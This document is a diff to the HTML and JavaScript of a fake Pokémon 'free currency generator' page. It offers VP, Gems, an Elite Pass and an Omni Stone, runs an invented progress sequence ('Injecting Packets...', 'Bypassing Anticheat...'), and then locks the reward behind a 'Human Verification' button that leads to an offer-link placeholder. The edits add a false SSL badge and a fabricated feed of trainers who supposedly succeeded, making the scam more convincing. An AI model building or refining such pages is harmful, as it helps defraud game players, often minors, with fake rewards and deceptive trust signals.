@@ -24,7 +24,7 @@
             padding: 0;
             overflow-x: hidden;
             background: linear-gradient(rgba(2, 5, 10, 0.9), rgba(2, 5, 10, 0.9)), 
-                        url('https://upload.wikimedia.org/wikipedia/commons/3/3e/Tokyo_Skyline_at_Night_Blue_Hour.jpg'); /* Stable Wikipedia BG */
+                        url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Tokyo_Skyline_at_Night_Blue_Hour.jpg/1280px-Tokyo_Skyline_at_Night_Blue_Hour.jpg');
             background-size: cover;
             background-attachment: fixed;
             background-position: center;
@@ -107,22 +107,23 @@
             padding: 20px;
             cursor: pointer;
             transition: 0.3s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .reward-card.active { border-color: var(--primary); background: rgba(0, 242, 255, 0.1); }
 
         .reward-card img { 
-            width: 60px; 
-            height: 60px;
+            width: 55px; 
+            height: 55px;
             object-fit: contain;
             margin-bottom: 10px; 
-            animation: float 3s ease-in-out infinite;
+            filter: drop-shadow(0 0 8px rgba(255,255,255,0.2));
         }
 
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
+        .reward-card span { display: block; font-weight: 900; font-size: 1.1rem; }
+        .reward-card small { color: var(--primary); font-size: 0.7rem; font-weight: bold; }
 
         .btn-action {
             background: linear-gradient(to right, var(--primary), #00a2ff);
@@ -150,10 +151,11 @@
         .activity-feed {
             margin-top: 25px;
             padding: 12px;
-            background: rgba(0,0,0,0.4);
+            background: rgba(0,0,0,0.5);
             border-radius: 50px;
             font-size: 0.8rem;
             color: #00f2ff;
+            border: 1px solid rgba(0,242,255,0.1);
         }
     </style>
 </head>
@@ -161,7 +163,7 @@
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
-    <div style="font-size: 0.7rem;">
+    <div style="font-size: 0.7rem; text-align: right;">
         <span style="color: #2ecc71;">● SERVER ONLINE</span>
     </div>
 </nav>
@@ -172,39 +174,40 @@
         
         <div id="ui-step1">
             <h2 style="margin-top: 40px; color: var(--primary);">Trainer Sync</h2>
-            <input type="text" class="input-ui" id="trainer-name" placeholder="Username...">
+            <p style="color:#aaa; font-size: 0.8rem; margin-bottom: 20px;">April 2026 Distribution Event</p>
+            <input type="text" class="input-ui" id="trainer-name" placeholder="Enter Username...">
             <select class="input-ui">
-                <option>iOS / Android</option>
-                <option>Nintendo Switch</option>
+                <option>Platform: iOS / Android</option>
+                <option>Platform: Nintendo Switch</option>
             </select>
-            <button class="btn-action" onclick="toStep2()">Continue</button>
+            <button class="btn-action" onclick="toStep2()">Connect</button>
         </div>
 
         <div id="ui-step2" class="hidden">
-            <h3 style="margin-bottom: 20px; font-size: 0.9rem;">Select Pack</h3>
+            <h3 style="margin-bottom: 20px; font-size: 0.9rem;">Select Distribution Pack</h3>
             <div class="grid-rewards">
                 <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Pok%C3%A9_Ball_icon.svg">
-                    <span style="display:block; font-weight:900;">50,000</span>
-                    <small style="color:var(--primary)">VP Points</small>
+                    <span>50,000</span>
+                    <small>VP Points</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Emerald_cut_ruby.svg/512px-Emerald_cut_ruby.svg.png">
-                    <span style="display:block; font-weight:900;">10,000</span>
-                    <small style="color:var(--primary)">Gems</small>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Diamond_icon_flat.svg">
+                    <span>10,000</span>
+                    <small>Gems</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Ticket_font_awesome.svg/512px-Ticket_font_awesome.svg.png" style="filter: invert(1) sepia(1) saturate(5) hue-rotate(170deg);">
-                    <span style="display:block; font-weight:900;">S12</span>
-                    <small style="color:var(--primary)">Elite Pass</small>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Ticket_font_awesome_blue.svg" style="filter: hue-rotate(140deg) brightness(1.2);">
+                    <span>S12</span>
+                    <small>Elite Pass</small>
                 </div>
                 <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Gold_Star.svg/512px-Gold_Star.svg.png">
-                    <span style="display:block; font-weight:900;">OMNI</span>
-                    <small style="color:var(--primary)">Stone</small>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Five_pointed_star.svg" style="filter: drop-shadow(0 0 5px #ffcc00);">
+                    <span>OMNI</span>
+                    <small>Stone</small>
                 </div>
             </div>
-            <button class="btn-action" onclick="toStep3()">Generate</button>
+            <button class="btn-action" onclick="toStep3()">Generate Assets</button>
         </div>
 
         <div id="ui-sync" class="hidden" style="padding: 40px 0;">
@@ -216,15 +219,18 @@
         </div>
 
         <div id="ui-locker" class="hidden">
-            <h3 style="color: var(--accent);">Verification Required</h3>
+            <h3 style="color: var(--accent);">Sync Paused</h3>
             <p style="font-size: 0.85rem; color: #ccc;">Finalize sync for: <span id="summary-res" style="color: var(--primary); font-weight:bold;">...</span></p>
             <div style="background: rgba(0, 242, 255, 0.05); padding: 25px; border: 2px dashed var(--primary); border-radius: 20px; margin: 20px 0;">
-                <button class="btn-action" style="margin:0;" onclick="window.location.href='YOUR_LINK_HERE'">VERIFY NOW</button>
+                <i class="fas fa-user-shield" style="font-size: 2rem; color: var(--primary); margin-bottom: 10px;"></i>
+                <p style="font-size: 0.8rem; font-weight: 800;">Human Verification Required</p>
+                <button class="btn-action" style="margin-top:15px; background: var(--accent); color:#fff;" onclick="window.location.href='YOUR_OFFER_LINK_HERE'">Verify Now</button>
             </div>
+            <div style="font-size: 0.7rem; color: var(--gold);"><i class="fas fa-lock"></i> SECURE SSL CONNECTION</div>
         </div>
 
         <div class="activity-feed">
-            <i class="fas fa-bolt"></i> <span id="live-text">Waiting...</span>
+            <i class="fas fa-bolt"></i> <span id="live-text">Waiting for trainer...</span>
         </div>
     </div>
 </div>
@@ -233,7 +239,8 @@
     let selectedItem = "50,000 VP";
 
     function toStep2() {
-        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Name');
+        const name = document.getElementById('trainer-name').value;
+        if(name.length < 3) return alert('Please enter a valid Username');
         document.getElementById('ui-step1').classList.add('hidden');
         document.getElementById('ui-step2').classList.remove('hidden');
     }
@@ -248,21 +255,30 @@
         document.getElementById('ui-step2').classList.add('hidden');
         document.getElementById('ui-sync').classList.remove('hidden');
         document.getElementById('summary-res').innerText = selectedItem;
+        
         let progress = 0;
+        const steps = ['Authenticating...', 'Finding UID...', 'Injecting Packets...', 'Bypassing Anticheat...', 'Ready!'];
+        
         const interval = setInterval(() => {
-            progress += 5;
+            progress += 4;
             document.getElementById('progress-bar').style.width = progress + '%';
+            document.getElementById('status-text').innerText = steps[Math.floor(progress/21)] || 'Finalizing...';
+            
             if(progress >= 100) {
                 clearInterval(interval);
-                document.getElementById('ui-sync').classList.add('hidden');
-                document.getElementById('ui-locker').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('ui-sync').classList.add('hidden');
+                    document.getElementById('ui-locker').classList.remove('hidden');
+                }, 500);
             }
-        }, 150);
+        }, 120);
     }
 
+    const trainers = ['X_Slayer_26', 'PokeGod_USA', 'Sara_Elite', 'Daniel_Pro', 'Volt_King'];
     setInterval(() => {
-        const t = ['User_X', 'ProPlayer', 'Ghost_99', 'Sara_PKM'][Math.floor(Math.random()*4)];
-        document.getElementById('live-text').innerText = `Trainer ${t} successfully synced!`;
+        const t = trainers[Math.floor(Math.random()*trainers.length)];
+        const r = ['50,000 VP', '10,000 Gems', 'Elite Pass', 'Omni Stone'][Math.floor(Math.random()*4)];
+        document.getElementById('live-text').innerText = `Trainer \`${t}\` successfully synced ${r}!`;
     }, 4000);
 </script>
 
